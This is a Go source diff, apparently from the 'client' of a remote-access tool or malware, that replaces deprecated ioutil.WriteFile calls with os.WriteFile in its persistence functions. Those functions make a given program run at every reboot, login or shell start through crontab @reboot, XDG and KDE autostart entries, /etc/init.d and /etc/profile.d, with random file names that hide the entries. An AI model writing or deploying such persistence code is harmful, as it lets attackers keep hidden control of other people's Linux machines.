@@ -1,7 +1,6 @@
 package client
 
 import (
-	"io/ioutil"
 	"log"
 	"os"
 	"path/filepath"
@@ -58,7 +57,7 @@ func PersistUser(path string) {
 }
 
 func crontab(path string) {
-	err := ioutil.WriteFile("tmp", []byte("@reboot "+path), os.ModePerm)
+	err := os.WriteFile("tmp", []byte("@reboot "+path), os.ModePerm)
 	if err != nil {
 		return
 	}
@@ -74,21 +73,21 @@ Name=` + crypto.GenRandString() + `
 Exec=` + path + `
 Terminal=false`
 	if admin {
-		ioutil.WriteFile("/etc/xdg/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
+		os.WriteFile("/etc/xdg/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
 		return
 	}
 
-	ioutil.WriteFile("~/.config/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
+	os.WriteFile("~/.config/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
 }
 
 func kdePlasma(path string) {
-	ioutil.WriteFile("~/.config/autostart-scripts/"+crypto.GenRandString()+".sh", []byte(sh+path), 0777)
+	os.WriteFile("~/.config/autostart-scripts/"+crypto.GenRandString()+".sh", []byte(sh+path), 0777)
 }
 
 func initD(path string) {
-	ioutil.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 0755)
+	os.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 0755)
 }
 
 func profileD(path string) {
-	ioutil.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 0644)
+	os.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 0644)
 }
